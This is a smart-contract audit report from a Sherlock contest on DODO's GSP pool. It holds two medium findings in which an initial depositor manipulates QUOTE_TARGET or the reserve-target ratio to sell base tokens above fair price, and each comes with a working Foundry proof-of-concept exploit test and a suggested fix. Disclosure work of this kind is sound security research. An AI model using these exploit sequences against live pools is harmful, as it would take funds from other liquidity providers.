# DODO GSP 

Type: CONTEST

Dates: 19 Dec 2023 - 24 Dec 2023

A leveraged market making solution to minimize IL and improve on liquidity management

Code Under Review: https://github.com/sherlock-audit/2023-12-dodo-gsp

More contest details: https://audits.sherlock.xyz/contests/135

Rank: 4

# Findings Summary

- Medium : 2


|ID|Title|Severity|
|-|:-|:-:|
| [M-01](#M-01)| lower decimal token as quote asset allows initial depositor to set QUOTE_TARGET to 0 always | Medium |
| [M-02](#M-02)| Initial depositor can alter the reserve-target ratio to trade subsequent depositors tokens at lower prices | Medium |


# Detailed Findings

# <a id='M-01'></a>M-01 lower decimal token as quote asset allows initial depositor to set QUOTE_TARGET to 0 always

## Vulnerability Detail
When totalSupply is 0, `_QUOTE_TARGET_` is calculated as`uint112(DecimalMath.mulFloor(shares, _I_))`. 
```solidity
        if (totalSupply == 0) {

            shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_)
                ? DecimalMath.divFloor(quoteBalance, _I_)
                : baseBalance;

            _BASE_TARGET_ = uint112(shares);
            _QUOTE_TARGET_ = uint112(DecimalMath.mulFloor(shares, _I_));
        } else if (baseReserve > 0 && quoteReserve > 0) {
```
For all further mints, the `_QUOTE_TARGET_` is updatd as `_QUOTE_TARGET_ = _QUOTE_TARGET_ + _QUOTE_TARGET_ * mintRatio`

Hence if the initial `_QUOTE_TARGET_` is 0, it will continue to remain 0 on further share mints. The initial `_QUOTE_TARGET_` can be made 0 if the quote token is lower decimaled such that 1001(just 1001, not 1001* 10 ** token decimals) base token equals 0 quote token, by initially passing in 1001 base tokens.

An attacker can make use of this to obtain a higher price for base token in trade effectively stealing quote assets from second LP / subsequent LP's as follows:
1. Sell 0 amount of quote token. This will make r_state == above_one
2. Next sell base. For this sell, the quadratic target calculation of base target will use (quote reserve - quote target == quote reserve) as delta. This will cause the ratio of (base target / base reserve) to be bigger than actual.

### POC Code
Add the following test to test/GPSTrader.t.sol after importing DODOMath and run `forge test --mt testHash_quoteTargetIs0`
```solidity
   function testHash_quoteTargetIs0() public {
        GSP gspTest = new GSP();
        mockBaseToken = new MockERC20("mockBaseToken", "mockBaseToken", 18);
        
        mockQuoteToken = new MockERC20("mockQuoteToken", "mockQuoteToken", 6);
        
        gspTest.init(
            MAINTAINER,
            address(mockBaseToken),
            address(mockQuoteToken),
            0,
            0,
            1e6,
            500000000000000,
            false
        );
        
        address attacker = address(123);
        mockBaseToken.mint(attacker, type(uint256).max);
        mockQuoteToken.mint(attacker, type(uint256).max);

        vm.startPrank(attacker);
        mockBaseToken.transfer(address(gspTest), 1e12-1);
        mockQuoteToken.transfer(address(gspTest), 0);
        gspTest.buyShares(attacker);

        assert(gspTest._QUOTE_TARGET_() == 0 && gspTest._BASE_TARGET_() ==  1e12-1);

        // donate 1 quote token so that next deposit doens't revert and the ratio is maintained
        mockQuoteToken.transfer(address(gspTest), 1);
        gspTest.sync();
        vm.stopPrank();

        address user = address(1234);
        mockBaseToken.mint(user, type(uint256).max);
        mockQuoteToken.mint(user, type(uint256).max);

        vm.startPrank(user);
        mockBaseToken.transfer(address(gspTest), 1e18);
        mockQuoteToken.transfer(address(gspTest), 1e6);
        gspTest.buyShares(attacker);
        vm.stopPrank();

        // now the attacker can make use of the large (reserve - target) to trade at a higher price
        vm.startPrank(attacker);

        // first call sellquotetoken to make r above one
        gspTest.sellQuote(attacker);
        // the calculated base target will be higher as the required amount to reach equillibrium for quote asset is 2e18 - 4000. Hence the attacker can sellBase at a price > 1 and obtain 2e18-4000 quoteTokens
        address receiver = address(12345);
        uint newTargetBaseAmount = DODOMath._SolveQuadraticFunctionForTarget(1e18+1e12-1,1e6 + 1 - 0,1e30,
            500000000000000);
        uint sellAmount = newTargetBaseAmount - (1e18+1e12-1);
        mockBaseToken.transfer(address(gspTest),sellAmount);
        uint receivedAmount = gspTest.sellBase(receiver);
        
        uint sellPrice  = receivedAmount * 1e18 / sellAmount;
       assert(sellPrice > 1e6); // sell price == 1000499
    }
```

## Impact
First depositor can cause `_QUOTE_TARGET_` to remain 0 and sell base asset at a higher price.
In DSPFactory, pools are creatable by any user with any ordering of base/quote assets. Depending on how these pools are integrated to the UI for LP's to provide liquidity such an attack might be pullable by the attacker himself. 

## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol#L56-L65

## Tool used
Manual Review

## Recommendation
Check whether `_QUOTE_TARGET_` > 0 for initial mint or handle the token ordering for pools.

# <a id='M-02'></a>M-02 Initial depositor can alter the reserve-target ratio to trade subsequent depositors tokens at lower prices

## Vulnerability Detail
When `r_state` is `above_one`, the next base target calculation involves the current quote token delta (current quote reserve - current quote target). The base target is calculated such that it will be reached when the enitre current quote delta is bought. Till this new base target is reached, the price of the base token will be higher than the fair price i. Vice versa is true when `r_state` is `below_one`.
```solidity
    function adjustedTarget(PMMState memory state) internal pure {
        ....
        } else if (state.R == RState.ABOVE_ONE) {
            state.B0 = DODOMath._SolveQuadraticFunctionForTarget(
                state.B,
                state.Q - state.Q0,
                DecimalMath.reciprocalFloor(state.i),
                state.K
            );
        }
    }
```

The initial depositor can inflate the value of a share without any value loss by donating token amounts and calling the sync function. This also doesn't change the Target values. 
```solidity
    function _sync() internal {

        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this)) - uint256(_MT_FEE_BASE_);
        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this)) - uint256(_MT_FEE_QUOTE_);
    
        .....
    
        if (baseBalance != _BASE_RESERVE_) {
            _BASE_RESERVE_ = uint112(baseBalance);
        }
        if (quoteBalance != _QUOTE_RESERVE_) {
            _QUOTE_RESERVE_ = uint112(quoteBalance);
        }
        
        .....
    }
```

Following the second user's deposit (in correct ratio ie. fair price ratio), the initial depositor can perform the following steps to sell base token at a higher price(vice versa for quote token):

1. Sell 0 amount of quote token. This will make r_state == above_one
2. Next sell base. For this sell, the quadratic target calculation of base target will use (quote reserve - quote target == quote reserve) as delta. This will cause the ratio of (base target / base reserve) to be bigger than actual.

Amount earnable couldn't be quantified due to time constraint but increases with k. With k == 0.0005 (used in test file), sell price in obtained was 1.0005 (fair price == 1) and with k == 0.05 it increased to 1.05

### POC Code
Add the following test to test/GPSTrader.t.sol after importing DODOMath and run `forge test --mt testHash_reserveTargetRatioIncrease`
```solidity
    import {DODOMath} from "../contracts/lib/DODOMath.sol";

    function testHash_reserveTargetRatioIncrease() public {
        GSP gspTest = new GSP();
        gspTest.init(
            MAINTAINER,
            address(mockBaseToken),
            address(mockQuoteToken),
            0,
            0,
            1e18,
            500000000000000,
            false
        );
        
        address attacker = address(123);
        mockBaseToken.mint(attacker,type(uint).max);
        mockQuoteToken.mint(attacker,type(uint).max);

        vm.startPrank(attacker);
        mockBaseToken.transfer(address(gspTest), 2000);
        mockQuoteToken.transfer(address(gspTest), 2000);

        // mint low amount of shares
        gspTest.buyShares(attacker);
        mockBaseToken.transfer(address(gspTest), 1e18 - 2000);
        mockQuoteToken.transfer(address(gspTest), 1e18 -2000);
        gspTest.sync();
        
        vm.stopPrank();

        // now reserve to target ratio is 5e14
        // next buy shares of user will keep this ratio

        address user = address(1234);
        mockBaseToken.mint(user,type(uint).max);
        mockQuoteToken.mint(user,type(uint).max);

        vm.startPrank(user);
        mockBaseToken.transfer(address(gspTest), 1e18);
        mockQuoteToken.transfer(address(gspTest), 1e18);

        gspTest.buyShares(user);
        
        vm.stopPrank();
        assert(gspTest._QUOTE_TARGET_() == 4000);
        assert(gspTest._BASE_TARGET_() == 4000);

        // now the attacker can make use of the large (reserve - target) to trade at a higher price
        vm.startPrank(attacker);

        // first call sellquotetoken to make r above one
        gspTest.sellQuote(attacker);
        // the calculated base target will be higher as the required amount to reach equillibrium for quote asset is 2e18 - 4000. Hence the attacker can sellBase at a price > 1 and obtain 2e18-4000 quoteTokens
        address receiver = address(12345);
        uint newTargetBaseAmount = DODOMath._SolveQuadraticFunctionForTarget(2e18,2e18 - 4000,1e18,
            500000000000000);
        uint sellAmount = newTargetBaseAmount - 2e18;
        mockBaseToken.transfer(address(gspTest),sellAmount);
        uint receivedAmount = gspTest.sellBase(receiver);
        
        uint sellPrice  = receivedAmount * 1e18 / sellAmount;
        assert(sellPrice > 1e18); // (1000499750249688627 ie. 1.0005)
    }
```

## Impact
First depositor can trade at an higher price at loss for second / subsequent LP's.

## Code Snippet
`sync` function callable by first depositor to increase share price
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPVault.sol#L118-L132

next depositor is minted higher valued share(hence low amount) and scales the target by the same amount
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol#L67-L75

## Tool used
Manual Review

## Recommendation
Allow the depositor to provide a `minShares` amount either in this contract or in router. This way the share value manipulation can be identified.